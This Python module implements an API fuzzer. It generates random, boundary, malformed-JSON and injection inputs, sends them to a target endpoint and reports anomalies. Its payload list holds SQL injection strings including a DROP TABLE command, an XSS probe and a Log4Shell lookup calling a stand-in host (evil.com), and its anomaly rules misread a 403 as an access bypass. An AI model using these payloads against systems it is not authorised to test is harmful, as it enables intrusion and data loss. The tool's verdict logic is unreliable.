"""
API Fuzzer Action Module.

Fuzz tests APIs by generating invalid, unexpected, and random inputs
to discover bugs, security vulnerabilities, and edge cases.

Author: RabAi Team
"""

from __future__ import annotations

import json
import random
import string
import uuid
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Any, Callable, Dict, List, Optional, Set, Tuple


class FuzzType(Enum):
    """Types of fuzzing strategies."""
    RANDOM = "random"
    BOUNDARY = "boundary"
    ENUMERATION = "enumeration"
    MALFORMED = "malformed"
    INJECTION = "injection"
    CORRUPTION = "corruption"


@dataclass
class FuzzTestCase:
    """A single fuzz test case."""
    id: str
    name: str
    fuzz_type: FuzzType
    endpoint: str
    method: str
    payload: Any
    expected_behavior: str = "error"
    severity: str = "medium"

    def to_dict(self) -> Dict[str, Any]:
        return {
            "id": self.id,
            "name": self.name,
            "fuzz_type": self.fuzz_type.value,
            "endpoint": self.endpoint,
            "method": self.method,
            "payload": str(self.payload)[:500],
            "expected_behavior": self.expected_behavior,
            "severity": self.severity,
        }


@dataclass
class FuzzResult:
    """Result of running a fuzz test."""
    test_case: FuzzTestCase
    status_code: Optional[int]
    response_time_ms: float
    passed: bool
    error: Optional[str] = None
    anomaly_detected: bool = False
    anomaly_details: Optional[str] = None
    timestamp: datetime = field(default_factory=datetime.now)


@dataclass
class FuzzReport:
    """Comprehensive fuzzing report."""
    target_url: str
    total_tests: int
    passed: int
    failed: int
    anomalies: List[FuzzResult] = field(default_factory=list)
    vulnerabilities: List[Dict[str, Any]] = field(default_factory=list)
    generated_at: datetime = field(default_factory=datetime.now)

    @property
    def anomaly_rate(self) -> float:
        return len(self.anomalies) / self.total_tests if self.total_tests > 0 else 0.0


class PayloadGenerator:
    """Generates fuzzed payloads."""

    @staticmethod
    def generate_random_string(length: int = 20) -> str:
        return "".join(random.choices(string.ascii_letters + string.digits, k=length))

    @staticmethod
    def generate_random_email() -> str:
        local = PayloadGenerator.generate_random_string(10)
        domain = random.choice(["test.com", "fuzz.io", "malicious.net"])
        return f"{local}@{domain}"

    @staticmethod
    def generate_boundary_values() -> List[Any]:
        return [
            0, -1, 1, 127, 128, 255, 256,
            32767, 32768, 65535, 65536,
            2147483647, 2147483648,
            -2147483648, -2147483649,
            0.0, -0.0, float("inf"), float("-inf"), float("nan"),
            "", " ", "\n", "\t", "\x00",
            None, True, False,
        ]

    @staticmethod
    def generate_sql_injection() -> List[str]:
        return [
            "' OR '1'='1",
            "'; DROP TABLE users;--",
            "1 UNION SELECT * FROM users--",
            "1' AND '1'='1",
            "admin'--",
            "<script>alert('xss')</script>",
            "{{ malicious }}",
            "${jndi:ldap://evil.com/a}",
        ]

    @staticmethod
    def generate_malformed_json() -> List[str]:
        return [
            '{"key": "value",}',
            '{"key": value}',
            '{"key": }',
            '{"key": "unclosed}',
            '[1, 2, 3,]',
            '{invalid}',
            '{"nested": {"deep": }}',
            '{"arr": [1, 2, not_json]}',
        ]


class APIFuzzer:
    """
    API fuzzing engine for testing API robustness.

    Generates and sends malformed, random, and boundary inputs
    to discover security vulnerabilities and error handling bugs.

    Example:
        >>> fuzzer = APIFuzzer("https://api.example.com")
        >>> fuzzer.set_send_fn(requests.post)
        >>> report = fuzzer.fuzz_endpoint("/api/users", {"name": "test"})
    """

    def __init__(self, target_url: str):
        self.target_url = target_url
        self._send_fn: Optional[Callable] = None
        self._results: List[FuzzResult] = []

    def set_send_fn(self, fn: Callable) -> None:
        """Set the HTTP send function."""
        self._send_fn = fn

    def generate_tests(
        self,
        endpoint: str,
        method: str = "POST",
        base_payload: Optional[Dict] = None,
        fuzz_types: Optional[List[FuzzType]] = None,
    ) -> List[FuzzTestCase]:
        """Generate fuzz test cases for an endpoint."""
        tests = []
        fuzz_types = fuzz_types or [FuzzType.RANDOM, FuzzType.BOUNDARY]
        base_payload = base_payload or {}

        if FuzzType.RANDOM in fuzz_types:
            tests.extend(self._generate_random_tests(endpoint, method, base_payload))

        if FuzzType.BOUNDARY in fuzz_types:
            tests.extend(self._generate_boundary_tests(endpoint, method, base_payload))

        if FuzzType.INJECTION in fuzz_types:
            tests.extend(self._generate_injection_tests(endpoint, method, base_payload))

        if FuzzType.MALFORMED in fuzz_types:
            tests.extend(self._generate_malformed_tests(endpoint, method))

        return tests

    def _generate_random_tests(
        self,
        endpoint: str,
        method: str,
        base_payload: Dict,
    ) -> List[FuzzTestCase]:
        tests = []
        for i in range(10):
            payload = base_payload.copy()
            payload["fuzz_field"] = PayloadGenerator.generate_random_string(50)
            tests.append(FuzzTestCase(
                id=str(uuid.uuid4()),
                name=f"random_fuzz_{i}",
                fuzz_type=FuzzType.RANDOM,
                endpoint=endpoint,
                method=method,
                payload=payload,
            ))
        return tests

    def _generate_boundary_tests(
        self,
        endpoint: str,
        method: str,
        base_payload: Dict,
    ) -> List[FuzzTestCase]:
        tests = []
        for i, boundary_val in enumerate(PayloadGenerator.generate_boundary_values()):
            payload = base_payload.copy()
            payload["boundary_field"] = boundary_val
            tests.append(FuzzTestCase(
                id=str(uuid.uuid4()),
                name=f"boundary_{i}",
                fuzz_type=FuzzType.BOUNDARY,
                endpoint=endpoint,
                method=method,
                payload=payload,
                severity="high",
            ))
        return tests

    def _generate_injection_tests(
        self,
        endpoint: str,
        method: str,
        base_payload: Dict,
    ) -> List[FuzzTestCase]:
        tests = []
        for i, injection in enumerate(PayloadGenerator.generate_sql_injection()):
            payload = base_payload.copy()
            payload["query"] = injection
            tests.append(FuzzTestCase(
                id=str(uuid.uuid4()),
                name=f"injection_{i}",
                fuzz_type=FuzzType.INJECTION,
                endpoint=endpoint,
                method=method,
                payload=payload,
                severity="critical",
            ))
        return tests

    def _generate_malformed_tests(
        self,
        endpoint: str,
        method: str,
    ) -> List[FuzzTestCase]:
        tests = []
        for i, malformed in enumerate(PayloadGenerator.generate_malformed_json()):
            tests.append(FuzzTestCase(
                id=str(uuid.uuid4()),
                name=f"malformed_{i}",
                fuzz_type=FuzzType.MALFORMED,
                endpoint=endpoint,
                method=method,
                payload=malformed,
                severity="medium",
            ))
        return tests

    def fuzz_endpoint(
        self,
        endpoint: str,
        base_payload: Optional[Dict] = None,
        fuzz_types: Optional[List[FuzzType]] = None,
        send_fn: Optional[Callable] = None,
    ) -> FuzzReport:
        """Run fuzzing tests against an endpoint."""
        send_fn = send_fn or self._send_fn
        if not send_fn:
            raise ValueError("No send function configured")

        tests = self.generate_tests(endpoint, "POST", base_payload, fuzz_types)
        results = []
        anomalies = []

        for test in tests:
            result = self._run_test(test, send_fn)
            results.append(result)
            if result.anomaly_detected:
                anomalies.append(result)

        vulnerabilities = self._detect_vulnerabilities(anomalies)

        passed = sum(1 for r in results if r.passed)
        failed = len(results) - passed

        return FuzzReport(
            target_url=f"{self.target_url}{endpoint}",
            total_tests=len(results),
            passed=passed,
            failed=failed,
            anomalies=anomalies,
            vulnerabilities=vulnerabilities,
        )

    def _run_test(self, test: FuzzTestCase, send_fn: Callable) -> FuzzResult:
        """Run a single fuzz test."""
        import time
        start = time.time()

        try:
            if isinstance(test.payload, str):
                response = send_fn(
                    f"{self.target_url}{test.endpoint}",
                    data=test.payload,
                    headers={"Content-Type": "application/json"},
                )
            else:
                response = send_fn(
                    f"{self.target_url}{test.endpoint}",
                    json=test.payload,
                )

            duration_ms = (time.time() - start) * 1000
            status = response.status_code if hasattr(response, "status_code") else None

            anomaly = self._detect_anomaly(status, response)

            return FuzzResult(
                test_case=test,
                status_code=status,
                response_time_ms=duration_ms,
                passed=anomaly is None,
                anomaly_detected=anomaly is not None,
                anomaly_details=anomaly,
            )

        except Exception as e:
            return FuzzResult(
                test_case=test,
                status_code=None,
                response_time_ms=(time.time() - start) * 1000,
                passed=True,
                error=str(e),
            )

    def _detect_anomaly(self, status_code: Optional[int], response: Any) -> Optional[str]:
        """Detect anomalies in response."""
        if status_code == 200:
            content = response.text if hasattr(response, "text") else ""
            if "error" in content.lower() and "stack" in content.lower():
                return "Internal error exposed in response"
            if "<script>" in content:
                return "XSS vulnerability detected"
        if status_code == 500:
            return "Server error - potential vulnerability"
        if status_code == 403:
            return "Access control bypass detected"
        return None

    def _detect_vulnerabilities(self, anomalies: List[FuzzResult]) -> List[Dict[str, Any]]:
        """Detect patterns in anomalies indicating vulnerabilities."""
        vulnerabilities = []
        injection_found = False

        for anomaly in anomalies:
            if anomaly.test_case.fuzz_type == FuzzType.INJECTION:
                if anomaly.anomaly_detected:
                    injection_found = True
                    vulnerabilities.append({
                        "type": "SQL/NoSQL Injection",
                        "severity": "critical",
                        "endpoint": anomaly.test_case.endpoint,
                        "payload": str(anomaly.test_case.payload)[:200],
                    })

        return vulnerabilities


def create_fuzzer(target_url: str) -> APIFuzzer:
    """Factory to create an API fuzzer."""
    return APIFuzzer(target_url=target_url)
